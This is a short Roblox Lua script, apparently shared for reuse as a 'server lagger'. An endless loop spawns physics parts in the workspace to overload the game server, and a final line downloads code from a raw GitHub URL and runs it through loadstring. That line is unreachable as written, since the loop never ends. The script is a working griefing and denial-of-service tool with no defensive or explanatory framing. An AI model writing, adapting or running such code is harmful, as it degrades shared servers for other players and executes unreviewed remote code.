-- you can use ts, no credits needed.
-- no delay server lagger

function ss_serverlagger()
	local script = Instance.new('Script', game.ServerScriptService)

	while task.wait() do
		local part = Instance.new("Part", workspace)
		part.Name = "wfafsafw"
		part.Anchored = false
		part.Position = Vector3.new(math.random(1, 100), 10, math.random(1, 100))
		part.Shape = Enum.PartType.Ball
		part.Size = Vector3.new(2,2,2)
		part.BrickColor = BrickColor.new("Lily White")
		local part1 = Instance.new("Part", workspace)
		part1.Name = "wgadsdwfdx"
		part1.Anchored = false
		part1.Position = Vector3.new(math.random(1, 100), 10, math.random(1, 100))
		part1.Shape = Enum.PartType.Ball
		part1.Size = Vector3.new(2,2,2)
		part1.BrickColor = BrickColor.new("Really blue")
		local part2 = Instance.new("Part", workspace)
		part2.Name = "fafsf"
		part2.Anchored = false
		part2.Position = Vector3.new(math.random(1, 100), 10, math.random(1, 100))
		part2.Shape = Enum.PartType.Ball
		part2.Size = Vector3.new(2,2,2)
		part2.BrickColor = BrickColor.new("Really red")
	end
end
ss_serverlagger()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CrystalzzDev/notif/main/loadstring"))()
